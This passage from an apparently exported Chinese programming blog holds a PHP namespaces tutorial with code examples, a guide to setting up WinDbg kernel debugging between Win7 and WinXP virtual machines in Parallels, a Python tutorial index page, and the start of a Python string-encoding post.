<p><font color="#00B2EE"><strong>基础：</strong></font><br>命名空间将代码划分出不同的空间（区域），每个空间的常量、函数、类（为了偷懒，我下边都将它们称为元素）的名字互不影响， 这个有点类似我们常常提到的‘封装’的概念。<br>创建一个命名空间需要使用namespace关键字，这样：<br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//创建一个名为<span class="string">&#x27;Article&#x27;</span>的命名空间</span><br><span class="line">namespace Article;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font color="red"><strong>要注意的是，当前脚本文件的第一个命名空间前面不能有任何代码，下面的写法都是错误的：</strong></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">//例一</span><br><span class="line">//在脚本前面写了一些逻辑代码</span><br><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$path</span> = <span class="string">&quot;/&quot;</span>;</span><br><span class="line">class Comment &#123; &#125;</span><br><span class="line">namespace Article;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">//例二</span><br><span class="line">//在脚本前面输出了一些字符</span><br><span class="line">&lt;html&gt;&lt;/html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">namespace Article;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>为什么要说第一个命名空间呢？<font color="red">因为同一脚本文件中可以创建多个命名空间。</font><br>下面我创建了两个命名空间，顺便为这两个空间各自添加了一个Comment类元素：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//创建一个名为&#x27;Article&#x27;的命名空间</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Article</span>;</span><br><span class="line"><span class="comment">//此Comment属于Article空间的元素</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Comment</span> </span>&#123; &#125;</span><br><span class="line"><span class="comment">//创建一个名为&#x27;MessageBoard&#x27;的命名空间</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">MessageBoard</span>;</span><br><span class="line"><span class="comment">//此Comment属于MessageBoard空间的元素</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Comment</span> </span>&#123; &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><strong>在不同空间之间不可以直接调用其它元素，需要使用命名空间的语法：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Article</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Comment</span> </span>&#123; &#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">MessageBoard</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Comment</span> </span>&#123; &#125;</span><br><span class="line"><span class="comment">//调用当前空间（MessageBoard）的Comment类</span></span><br><span class="line"><span class="variable">$comment</span> = <span class="keyword">new</span> Comment();</span><br><span class="line"><span class="comment">//调用Article空间的Comment类</span></span><br><span class="line"><span class="variable">$article_comment</span> = <span class="keyword">new</span> \Article\Comment();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<blockquote>
<p>可以看到，在MessageBoard空间中调用article空间里的Comment类时，使用了一种像文件路径的语法： \空间名\元素名<br>除了类之外，对函数和常量的用法是一样的，下面我为两个空间创建了新的元素，并在MessageBoard空间中输出了它们的值。</p>
</blockquote>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace Article;</span><br><span class="line">const PATH = <span class="string">&#x27;/article&#x27;</span>;</span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">getCommentTotal</span></span>() &#123;</span><br><span class="line">    <span class="built_in">return</span> 100;</span><br><span class="line">&#125;</span><br><span class="line">class Comment &#123; &#125;</span><br><span class="line"></span><br><span class="line">namespace MessageBoard;</span><br><span class="line">const PATH = <span class="string">&#x27;/message_board&#x27;</span>;</span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">getCommentTotal</span></span>() &#123;</span><br><span class="line">    <span class="built_in">return</span> 300;</span><br><span class="line">&#125;</span><br><span class="line">class Comment &#123; &#125;</span><br><span class="line">//调用当前空间的常量、函数和类</span><br><span class="line"><span class="built_in">echo</span> PATH; ///message_board</span><br><span class="line"><span class="built_in">echo</span> getCommentTotal(); //300</span><br><span class="line"><span class="variable">$comment</span> = new Comment();</span><br><span class="line"></span><br><span class="line">//调用Article空间的常量、函数和类</span><br><span class="line"><span class="built_in">echo</span> \Article\PATH; ///article</span><br><span class="line"><span class="built_in">echo</span> \Article\getCommentTotal(); //100</span><br><span class="line"><span class="variable">$article_comment</span> = new \Article\Comment();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>然后我的确得到了Article空间的元素数据。<br>&amp;emsp;<br><font face="Comic sans MS"><font color="red"><strong>子空间</strong></font><br>命名空间的调用语法像文件路径一样是有道理的，它允许我们自定义子空间来描述各个空间之间的关系。<br>抱歉我忘了说，article和message board这两个模块其实都是处于同一个blog项目内。如果用命名空间来表达它们的关系，是这样：<br></font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//我用这样的命名空间表示处于blog下的article模块</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Blog</span>\<span class="title">Article</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Comment</span> </span>&#123; &#125;</span><br><span class="line"><span class="comment">//我用这样的命名空间表示处于blog下的message board模块</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Blog</span>\<span class="title">MessageBoard</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Comment</span> </span>&#123; &#125;</span><br><span class="line"><span class="comment">//调用当前空间的类</span></span><br><span class="line"><span class="variable">$comment</span> = <span class="keyword">new</span> Comment();</span><br><span class="line"><span class="comment">//调用Blog\Article空间的类</span></span><br><span class="line"><span class="variable">$article_comment</span> = <span class="keyword">new</span> \Blog\Article\Comment();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>而且，子空间还可以定义很多层次，比如说 Blog\Article\Archives\Date</p>
<p>&amp;emsp;<br><font face="Comic sans MS"><font color="red"><strong>公共空间</strong></font><br>我有一个common_inc.php脚本文件，里面有一些好用的函数和类：</font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">getIP</span></span>() &#123; &#125;</span><br><span class="line">class FilterXSS &#123; &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font face="Comic sans MS">在一个命名空间里引入这个脚本，脚本里的元素不会归属到这个命名空间。如果这个脚本里没有定义其它命名空间，它的元素就始终处于公共空间中：<br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace Blog\Article;</span><br><span class="line">//引入脚本文件</span><br><span class="line">include <span class="string">&#x27;./common_inc.php&#x27;</span>;</span><br><span class="line"><span class="variable">$filter_XSS</span> = new FilterXSS(); //出现致命错误：找不到Blog\Article\FilterXSS类</span><br><span class="line"><span class="variable">$filter_XSS</span> = new \FilterXSS(); //正确</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font face="Comic sans MS"><br>调用公共空间的方式是直接在元素名称前加 \ 就可以了，否则PHP解析器会认为我想调用当前空间下的元素。除了自定义的元素，还包括PHP自带的元素，都属于公共空间。<br>要提一下，其实公共空间的函数和常量不用加 \ 也可以正常调用（不明白PHP为什么要这样做），但是为了正确区分元素，还是建议调用函数的时候加上 \</p>
<p><strong>名称术语</strong><br>在说别名和导入之前，需要知道关于空间三种名称的术语，以及PHP是怎样解析它们的。官方文档说得非常好，我就直接拿来套了。</p>
<p>1.非限定名称，或不包含前缀的类名称，例如 $comment &#x3D; new Comment();。如果当前命名空间是Blog\Article，Comment将被解析为Blog\Article\Comment。如果使用Comment的代码不包含在任何命名空间中的代码（全局空间中），则Comment会被解析为Comment。</p>
<p>2.限定名称，或包含前缀的名称，例如 $comment &#x3D; new Article\Comment();。如果当前的命名空间是Blog，则Comment会被解析为Blog\Article\Comment。如果使用Comment的代码不包含在任何命名空间中的代码（全局空间中），则Comment会被解析为Comment。</p>
<p>3.完全限定名称，或包含了全局前缀操作符的名称，例如 $comment &#x3D; new \Article\Comment();。在这种情况下，Comment总是被解析为代码中的文字名(literal name)Article\Comment。</p>
<p>其实可以把这三种名称类比为文件名（例如 comment.php）、相对路径名（例如 .&#x2F;article&#x2F;comment.php）、绝对路径名（例如 &#x2F;blog&#x2F;article&#x2F;comment.php），这样可能会更容易理解。</p>
<p>我用了几个示例来表示它们：<br></font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//创建空间Blog</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Blog</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Comment</span> </span>&#123; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//非限定名称，表示当前Blog空间</span></span><br><span class="line"><span class="comment">//这个调用将被解析成 Blog\Comment();</span></span><br><span class="line"><span class="variable">$blog_comment</span> = <span class="keyword">new</span> Comment();</span><br><span class="line"></span><br><span class="line"><span class="comment">//限定名称，表示相对于Blog空间</span></span><br><span class="line"><span class="comment">//这个调用将被解析成 Blog\Article\Comment();</span></span><br><span class="line"><span class="variable">$article_comment</span> = <span class="keyword">new</span> Article\Comment(); <span class="comment">//类前面没有反斜杆\</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//完全限定名称，表示绝对于Blog空间</span></span><br><span class="line"><span class="comment">//这个调用将被解析成 Blog\Comment();</span></span><br><span class="line"><span class="variable">$article_comment</span> = <span class="keyword">new</span> \Blog\Comment(); <span class="comment">//类前面有反斜杆\</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//完全限定名称，表示绝对于Blog空间</span></span><br><span class="line"><span class="comment">//这个调用将被解析成 Blog\Article\Comment();</span></span><br><span class="line"><span class="variable">$article_comment</span> = <span class="keyword">new</span> \Blog\Article\Comment(); <span class="comment">//类前面有反斜杆\</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//创建Blog的子空间Article</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Blog</span>\<span class="title">Article</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Comment</span> </span>&#123; &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font face="Comic sans MS">其实之前我就一直在使用非限定名称和完全限定名称，现在它们终于可以叫出它们的名称了。<br><strong>别名和导入</strong><br>别名和导入可以看作是调用命名空间元素的一种快捷方式。PHP并不支持导入函数或常量。<br>它们都是通过使用use操作符来实现：<br></font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Blog</span>\<span class="title">Article</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Comment</span> </span>&#123; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建一个BBS空间（我有打算开个论坛）</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">BBS</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//导入一个命名空间</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">Blog</span>\<span class="title">Article</span>;</span><br><span class="line"><span class="comment">//导入命名空间后可使用限定名称调用元素</span></span><br><span class="line"><span class="variable">$article_comment</span> = <span class="keyword">new</span> Article\Comment();</span><br><span class="line"></span><br><span class="line"><span class="comment">//为命名空间使用别名</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">Blog</span>\<span class="title">Article</span> <span class="title">as</span> <span class="title">Arte</span>;</span><br><span class="line"><span class="comment">//使用别名代替空间名</span></span><br><span class="line"><span class="variable">$article_comment</span> = <span class="keyword">new</span> Arte\Comment();</span><br><span class="line"></span><br><span class="line"><span class="comment">//导入一个类</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">Blog</span>\<span class="title">Article</span>\<span class="title">Comment</span>;</span><br><span class="line"><span class="comment">//导入类后可使用非限定名称调用元素</span></span><br><span class="line"><span class="variable">$article_comment</span> = <span class="keyword">new</span> Comment();</span><br><span class="line"></span><br><span class="line"><span class="comment">//为类使用别名</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">Blog</span>\<span class="title">Article</span>\<span class="title">Comment</span> <span class="title">as</span> <span class="title">Comt</span>;</span><br><span class="line"><span class="comment">//使用别名代替空间名</span></span><br><span class="line"><span class="variable">$article_comment</span> = <span class="keyword">new</span> Comt();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


<p>我注意到，如果导入元素的时候，当前空间有相同的名字元素将会怎样？显然结果会发生致命错误。<br>例：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace Blog\Article;</span><br><span class="line">class Comment &#123; &#125;</span><br><span class="line"></span><br><span class="line">namespace BBS;</span><br><span class="line">class Comment &#123; &#125;</span><br><span class="line">Class Comt &#123; &#125;</span><br><span class="line"></span><br><span class="line">//导入一个类</span><br><span class="line">use Blog\Article\Comment;</span><br><span class="line"><span class="variable">$article_comment</span> = new Comment(); //与当前空间的Comment发生冲突，程序产生致命错误</span><br><span class="line"></span><br><span class="line">//为类使用别名</span><br><span class="line">use Blog\Article\Comment as Comt;</span><br><span class="line"><span class="variable">$article_comment</span> = new Comt(); //与当前空间的Comt发生冲突，程序产生致命错误</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><strong>动态调用</strong><br>PHP提供了namespace关键字和__NAMESPACE__魔法常量动态的访问元素，__NAMESPACE__可以通过组合字符串的形式来动态访问：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Blog</span>\<span class="title">Article</span>;</span><br><span class="line"><span class="keyword">const</span> PATH = <span class="string">&#x27;/Blog/article&#x27;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Comment</span> </span>&#123; &#125;</span><br><span class="line"><span class="comment">//namespace关键字表示当前空间</span></span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">namespace</span>\<span class="title">PATH</span>; <span class="comment">///Blog/article</span></span><br><span class="line"><span class="variable">$comment</span> = <span class="keyword">new</span> <span class="keyword">namespace</span>\<span class="title">Comment</span>();</span><br><span class="line"><span class="comment">//魔法常量__NAMESPACE__的值是当前空间名称</span></span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">__NAMESPACE__</span>; <span class="comment">//Blog\Article</span></span><br><span class="line"><span class="comment">//可以组合成字符串并调用</span></span><br><span class="line"><span class="variable">$comment_class_name</span> = <span class="keyword">__NAMESPACE__</span> . <span class="string">&#x27;\Comment&#x27;</span>;</span><br><span class="line"><span class="variable">$comment</span> = <span class="keyword">new</span> <span class="variable">$comment_class_name</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>字符串形式调用问题<br>上面的动态调用的例子中，我们看到了字符串形式的动态调用方式，如果要使用这种方式要注意两个问题。<br><font color="red"><strong>1. 使用双引号的时候特殊字符可能被转义</strong></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace Blog\Article;</span><br><span class="line">class name &#123; &#125;</span><br><span class="line">//我是想调用Blog\Article\name</span><br><span class="line"><span class="variable">$class_name</span> = __NAMESPACE__ . <span class="string">&quot;\name&quot;</span>; //但是\n将被转义为换行符</span><br><span class="line"><span class="variable">$name</span> = new <span class="variable">$class_name</span>(); //发生致命错误</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font color="red"><strong>2. 不会认为是限定名称</strong></font><br>PHP在编译脚本的时候就确定了元素所在的空间，以及导入的情况。而在解析脚本时字符串形式调用只能认为是非限定名称和完全限定名称，而永远不可能是限定名称。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Blog</span>;</span><br><span class="line"><span class="comment">//导入Common类</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">Blog</span>\<span class="title">Article</span>\<span class="title">Common</span>;</span><br><span class="line"><span class="comment">//我想使用非限定名称调用Blog\Article\Common</span></span><br><span class="line"><span class="variable">$common_class_name</span> = <span class="string">&#x27;Common&#x27;</span>;</span><br><span class="line"><span class="comment">//实际会被当作非限定名称，也就表示当前空间的Common类，但我当前类没有创建Common类</span></span><br><span class="line"><span class="variable">$common</span> = <span class="keyword">new</span> <span class="variable">$common_class_name</span>(); <span class="comment">//发生致命错误：Common类不存在</span></span><br><span class="line"><span class="comment">//我想使用限定名称调用Blog\Article\Common</span></span><br><span class="line"><span class="variable">$common_class_name</span> = <span class="string">&#x27;Article\Common&#x27;</span>;</span><br><span class="line"><span class="comment">//实际会被当作完全限定名称，也就表示Article空间下的Common类，但我下面只定义了Blog\Article空间而不是Article空间</span></span><br><span class="line"><span class="variable">$common</span> = <span class="keyword">new</span> <span class="variable">$common_class_name</span>(); <span class="comment">//发生致命错误：Article\Common类不存在</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Blog</span>\<span class="title">Article</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Common</span> </span>&#123; &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP语言</tag>
      </tags>
  </entry>
  <entry>
    <title>Parallels+Windbg+Win7+WinXP搭建双机调试</title>
    <url>/post/Parallels-Windbg-Win7-WinXP/</url>
    <content><![CDATA[<p>ʕ •ᴥ•ʔ  ɔ: </p>
<span id="more"></span>

<h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1 前言"></a>1 前言</h2><p>网上教程基本都是VmWare通过命名管道的串口方式进行双机调试的环境搭建。条件不允许，手头只有Parallels和VmWare Fusion。Parallels搭建双机调试的教程Google没有找到。于是自己摸索了记录一下（着急就看下一章开始使用）。</p>
<p>先做定义（参见<a href="https://docs.microsoft.com/zh-cn/windows-hardware/drivers/debugger/performing-kernel-mode-debugging-using-windbg">使用 WinDbg 进行实时内核模式调试</a>）：</p>
<ul>
<li>用来做调试的机器：<strong>主计算机</strong></li>
<li>被调试的机器：<strong>目标计算机</strong></li>
</ul>
<p>为了方便，许多人使用以下2种方式搭建：</p>
<ol>
<li>VmWare下，搭建2个虚拟机，Windows7+Win XP，然后使用串口的命名管道方式进行通信；</li>
<li>VmWare下，主计算机为Windows7，Windows7中安装VmWare然后装一个Win XP，使用串口的命名管道方式进行通信；</li>
<li>主计算机为本机（非虚拟机），目标计算机为虚拟机。</li>
</ol>
<p>上述方式2下会遇到的几个问题：</p>
<ol>
<li>虚拟机中装虚拟机会导致主计算机性能降低。我给了VmWare Fusion 8G内存4核心，在装Win XP时仍然很卡；</li>
<li>虚拟机中装虚拟机会提示“Intel VT-x处于禁用状态”，处理方法：<ul>
<li>需要进入主计算机系统的BIOS，选中“Intel （R）Virtualization Technology”，设为启用“Enabled”；</li>
<li>但上述方式2的主计算机是虚拟机，无法进入BIOS。VmWare可以在设置中“CPU与内存”中高级设置勾选上允许虚拟化即可。PD要在Pro版本下面才可以设置。</li>
</ul>
</li>
</ol>
<div class="note default"><p>为什么要用Parallels Desktop而非VmWare Fusion：</p>
<ul>
<li>PD能够使鼠标无缝衔接，无须按Control+Command（VmWare Fusion太烦了每次都要切换鼠标）；</li>
<li>PD的流畅度可以做到和实体机一样，哪怕只分给虚拟机很少的内存和CPU（PD下的Win7给2CPU+2G，运行VS2019、OD、Chrome、VC++6很流畅）；</li>
</ul>
</div>

<h2 id="2-Parallels搭建双机调试环境"><a href="#2-Parallels搭建双机调试环境" class="headerlink" title="2 Parallels搭建双机调试环境"></a>2 Parallels搭建双机调试环境</h2><p>基础环境：</p>
<ul>
<li>macOS Monterey 12.0.1</li>
<li>Parallels Desktop 16.0.1（Monterey目前不支持PD17）</li>
<li>Windows 7 Professional SP3.iso</li>
<li>Windows XP Professional SP3.iso</li>
<li>WDK7600（自带Windbg）</li>
<li>调试符号的安装程序</li>
</ul>
<p>搭建场景：</p>
<p>由于手残，将系统升级到了Monterey，但是之前的皇帝版PD17不能用了，网上看了一圈，仅商业版的PD16.0.1可用，那就不能处理“Intel VT-x处于禁用状态”这样提示了，也就是暂时不能在虚拟机中安装虚拟机了。故采用一下方案：</p>
<ul>
<li>使用PD安装2个虚拟机，主计算机为Windows7，目标计算机为Windows XP。</li>
</ul>
<h3 id="2-1-安装Win-XP"><a href="#2-1-安装Win-XP" class="headerlink" title="2.1 安装Win XP"></a>2.1 安装Win XP</h3><ol>
<li><p>Windows XP中修改C盘根目录下的隐藏文件<code>boot.ini</code>：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">[boot loader]</span><br><span class="line">timeout=<span class="number">30</span></span><br><span class="line"><span class="keyword">default</span>=multi(<span class="number">0</span>)disk(<span class="number">0</span>)rdisk(<span class="number">0</span>)partition(<span class="number">1</span>)\WINDOWS</span><br><span class="line">[operating systems]</span><br><span class="line">multi(<span class="number">0</span>)disk(<span class="number">0</span>)rdisk(<span class="number">0</span>)partition(<span class="number">1</span>)\WINDOWS=<span class="string">&quot;Microsoft Windows XP Professional&quot;</span> /noexecute=optin /fastdetect</span><br><span class="line">multi(<span class="number">0</span>)disk(<span class="number">0</span>)rdisk(<span class="number">0</span>)partition(<span class="number">1</span>)\WINDOWS=<span class="string">&quot;Debug&quot;</span> /noexecute=optin /fastdetect /debug /debugport=com1</span><br></pre></td></tr></table></figure>

<ul>
<li><p>串口的名称为：<strong>com1</strong>（只能填com1，PD无法识别com2）</p>
<p><img data-src="https://s2.loli.net/2021/12/25/CinvZQTtueVREja.png" alt="1.png"></p>
</li>
</ul>
<ol>
<li>硬件 – “+” – 串行口 – 源：名称为<code>com1</code></li>
<li>模式：客户端（必须是客户端，Win7为服务器端，不同于VmWare）</li>
</ol>
</li>
</ol>
<h3 id="2-2-安装Win7"><a href="#2-2-安装Win7" class="headerlink" title="2.2 安装Win7"></a>2.2 安装Win7</h3><ol>
<li><p>安装WDK，找到Windbg.exe并创建快捷方式到桌面，路径：<code>C:\WinDDK\7600.16385.1\Debuggers\windbg.exe</code>。</p>
</li>
<li><p>安装对应的Windows调试符号程序。（以默认安装路径安装，否则后续较麻烦）</p>
</li>
<li><p>给Windbg添加启动参数：</p>
<p>右键 – 属性 – <code>C:\WinDDK\7600.16385.1\Debuggers\windbg.exe -b -k com:port=com1,baud=115200,reconnect -y</code></p>
</li>
<li><p>打开Windbg，添加调试符号路径：File – Symbol File Path添加：</p>
<p><code>C:/WINDOWS/Symbols;srv*C:/WINDOWS/Symbols*http://msdl.microsoft.com/download/symbols;</code> ，然后<code>reload</code>。</p>
</li>
<li><p>关机后添加串口如下图。</p>
<p><img data-src="https://s2.loli.net/2021/12/25/3tdNShQs7bYZoiP.png" alt="2.png"></p>
</li>
</ol>
<h3 id="2-3-虚拟机启动-x2F-关闭顺序"><a href="#2-3-虚拟机启动-x2F-关闭顺序" class="headerlink" title="2.3 虚拟机启动&#x2F;关闭顺序"></a>2.3 虚拟机启动&#x2F;关闭顺序</h3><p>启动顺序：</p>
<ol>
<li>启动Win7，打开桌面的Windbg。</li>
<li>启动Win XP。</li>
</ol>
<p>中止顺序：</p>
<ol>
<li>Win XP。</li>
<li>Win7。</li>
</ol>
]]></content>
      <categories>
        <category>笔记</category>
        <category>Windows内核</category>
      </categories>
      <tags>
        <tag>内核</tag>
      </tags>
  </entry>
  <entry>
    <title>Python-基础</title>
    <url>/post/Python-Basics/</url>
    <content><![CDATA[<p>从今天开始Python的学习吧……ヾ(๑╹◡╹)ﾉ”</p>
<span id="more"></span>
<p>本文参考：<br><font color="#00B2EE">[<a href="http://www.runoob.com/python3/python3-tutorial.html">Python3 教程</a>]</font><br><font color="#00B2EE">[<a href="https://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000/001431658624177ea4f8fcb06bc4d0e8aab2fd7aa65dd95000">廖雪峰的官方网站Python教程</a>]</font><br><font color="#00B2EE">[<a href="http://www.ituring.com.cn/book/tupubarticle/10626">Python编程：从入门到实践</a>]</font><br><font color="#00B2EE">[<a href="http://www.pythondoc.com/">Python 中文学习大本营-Python 3.6.X 官方教程</a>]</font></p>
<p>&amp;ensp;<br>&amp;ensp;</p>
<center><font color="#00B2EE" face="Comic sans MS" size=5>Python 基础</font> </center>



<p>&amp;emsp;<br>&amp;emsp;</p>
<h3 id="一-基础语法"><a href="#一-基础语法" class="headerlink" title="一. 基础语法"></a><font color="#FF6347" face="Comic sans MS">一. 基础语法</font></h3><p><font face="Comic sans MS"><font color="#00B2EE"><strong>参见本站博客：[<a href="https://directoree.top/post/Python-Grammar">Python-基础语法</a>]</strong></font><br></font></p>
<br>

<br>

<h3 id="二-变量和数据类型"><a href="#二-变量和数据类型" class="headerlink" title="二. 变量和数据类型"></a><font color="#FF6347" face="Comic sans MS">二. 变量和数据类型</font></h3><p><font face="Comic sans MS"><font color="#00B2EE"><strong>参见本站博客：[<a href="https://directoree.top/post/Python-Variables-DataTypes">Python-变量和数据类型</a>]</strong></font><br></font></p>
<br>

<br>

<h3 id="三-运算符"><a href="#三-运算符" class="headerlink" title="三. 运算符"></a><font color="#FF6347" face="Comic sans MS">三. 运算符</font></h3><p><font face="Comic sans MS"><font color="#00B2EE"><strong>参见本站博客：[<a href="https://directoree.top/post/Python-Operators">Python-运算符</a>]</strong></font><br></font></p>
<br>

<br>

<h3 id="四-条件语句与循环"><a href="#四-条件语句与循环" class="headerlink" title="四. 条件语句与循环"></a><font color="#FF6347" face="Comic sans MS">四. 条件语句与循环</font></h3><p><font face="Comic sans MS"><font color="#00B2EE"><strong>参见本站博客：[<a href="https://directoree.top/post/Python-ConditionalStatements-loops">Python-条件语句与循环</a>]</strong></font><br></font></p>
<br>

<br>

<h3 id="五-字符编码、字符串、格式化"><a href="#五-字符编码、字符串、格式化" class="headerlink" title="五. 字符编码、字符串、格式化"></a><font color="#FF6347" face="Comic sans MS">五. 字符编码、字符串、格式化</font></h3><p><font face="Comic sans MS"><font color="#00B2EE"><strong>参见本站博客：[<a href="https://directoree.top/post/Python-Coding">Python-字符编码&amp;字符串&amp;格式化</a>]</strong></font><br></font></p>
<br>

<br>

<h3 id="六-列表、元组、字典、集合"><a href="#六-列表、元组、字典、集合" class="headerlink" title="六. 列表、元组、字典、集合"></a><font color="#FF6347" face="Comic sans MS">六. 列表、元组、字典、集合</font></h3><p><font face="Comic sans MS"><font color="#00B2EE"><strong>参见本站博客：[<a href="https://directoree.top/post/Python-list-tuple-dict-set">Python-列表、元组、字典、集合</a>]</strong></font><br></font></p>
<br>

<br>

<h3 id="七-函数"><a href="#七-函数" class="headerlink" title="七. 函数"></a><font color="#FF6347" face="Comic sans MS">七. 函数</font></h3><p><font face="Comic sans MS"><font color="#00B2EE"><strong>参见本站博客：[<a href="https://directoree.top/post/Python-Function">Python-函数</a>]</strong></font><br></font></p>
<br>

<br>

<h3 id="八-生成器与迭代器"><a href="#八-生成器与迭代器" class="headerlink" title="八. 生成器与迭代器"></a><font color="#FF6347" face="Comic sans MS">八. 生成器与迭代器</font></h3><p><font face="Comic sans MS"><font color="#00B2EE"><strong>参见本站博客：[<a href="https://directoree.top/post/Python-generator-iterator">Python-生成器与迭代器</a>]</strong></font><br></font></p>
<br>

<br>

<h3 id="九-模块和包"><a href="#九-模块和包" class="headerlink" title="九. 模块和包"></a><font color="#FF6347" face="Comic sans MS">九. 模块和包</font></h3><p><font face="Comic sans MS"><font color="#00B2EE"><strong>参见本站博客：[<a href="https://directoree.top/post/Python-Modules-Packages">Python-模块和包</a>]</strong></font><br></font></p>
<br>

<br>

<h3 id="十-函数式编程"><a href="#十-函数式编程" class="headerlink" title="十. 函数式编程"></a><font color="#FF6347" face="Comic sans MS">十. 函数式编程</font></h3><p><font face="Comic sans MS"><font color="#00B2EE"><strong>参见本站博客：[<a href="https://directoree.top/post/Python-FunctionalProgramming">Python-函数式编程</a>]</strong></font><br></font></p>
<br>

<br>

<h3 id="十一-文件系统"><a href="#十一-文件系统" class="headerlink" title="十一. 文件系统"></a><font color="#FF6347" face="Comic sans MS">十一. 文件系统</font></h3><p><font face="Comic sans MS"><font color="#00B2EE"><strong>参见本站博客：[<a href="https://directoree.top/post/Python-FileContents">Python-文件系统</a>]</strong></font><br></font></p>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python语言</tag>
      </tags>
  </entry>
  <entry>
    <title>Python-字符编码&amp;字符串&amp;格式化</title>
    <url>/post/Python-Coding/</url>
    <content><![CDATA[<p>字符编码、字符串(๑°⌓︎°๑) </p>
<span id="more"></span>

<br>

<br>


<center><font color="#00B2EE" face="Comic sans MS" size=5>Python-字符编码、字符串、格式化</font> </center>

<br>

<br>

